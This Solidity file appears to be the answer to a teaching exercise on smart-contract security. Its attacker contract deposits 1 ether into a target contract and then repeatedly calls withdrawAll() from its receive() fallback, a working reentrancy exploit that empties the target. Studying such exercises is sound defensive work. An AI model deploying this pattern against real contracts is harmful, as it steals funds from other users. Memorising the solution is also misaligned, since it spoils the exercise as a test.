// SPDX-License-Identifier: MIT
// WARNING: This is buggy code. Do NOT use in the real world.

pragma solidity 0.8.24;

import "./shared/AttackerBase.sol";

contract AttackerSolutionPattern0 is AttackerBase {
  // IMPORTANT: ONLY CHANGE THE FUNCTIONS THAT HAVE BEEN OUTLINED IN THE INSTRUCTIONS
  uint256 private constant _ATTACK_AMOUNT = 1 ether;

  constructor(
    address _vulnerableContractAddress
  ) public payable AttackerBase(_vulnerableContractAddress) {}

  function attack() external override {
    // Helpful for debugging
    emit AttackerContractBalance_(address(this).balance / 1 ether);

    // TIP: You can call methods on the vulnerableContract
    // E.g., `vulnerableContract.withdrawAll()`

    // COMMENT GROUP A: START
    vulnerableContract.deposit{value: _ATTACK_AMOUNT}();
    vulnerableContract.withdrawAll();
    // COMMENT GROUP A: END

    // Helpful for debugging
    emit AttackerContractBalance_(address(this).balance / 1 ether);
    emit VulnerableContractBalance_(
      address(vulnerableContract).balance / 1 ether
    );
  }

  // Function is executed when VulnerableContract sends ETH.
  receive() external payable override {
    // Helpful for debugging
    emit AttackerContractBalance_(address(this).balance / 1 ether);
    emit VulnerableContractBalance_(
      address(vulnerableContract).balance / 1 ether
    );
    emit AttackerDepositBalance_(
      vulnerableContract.balances(address(this)) / 1 ether
    );

    // TIP: You can call methods on the vulnerableContract
    // E.g., `vulnerableContract.withdrawAll()`

    // COMMENT GROUP A: START
    if (address(vulnerableContract).balance > 0) {
      vulnerableContract.withdrawAll();
    }
    // COMMENT GROUP A: END
  }
}
